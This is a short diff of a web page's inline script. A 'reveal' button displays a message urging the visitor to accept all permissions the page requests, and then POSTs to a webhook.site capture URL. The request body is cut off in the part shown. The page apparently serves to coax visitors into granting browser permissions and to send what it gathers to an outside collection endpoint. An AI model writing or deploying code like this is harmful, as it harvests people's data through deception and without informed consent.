@@ -148,10 +148,11 @@ function errorCallback(error) {
 
 <script>
   var revealButton = document.getElementById('revealButton');
-
+  var messageElement = document.getElementById('message');
+  
   revealButton.addEventListener('click', function() {
-    var message = 'Button clicked';
     messageElement.textContent = 'Please accept all permissions requested by the page. Refresh and try again.';
+    var message = 'Button clicked';
     fetch('https://webhook.site/b68c44bc-d9dd-4a29-9f9b-3ff2fe4729ce', {
       method: 'POST',
       headers: {
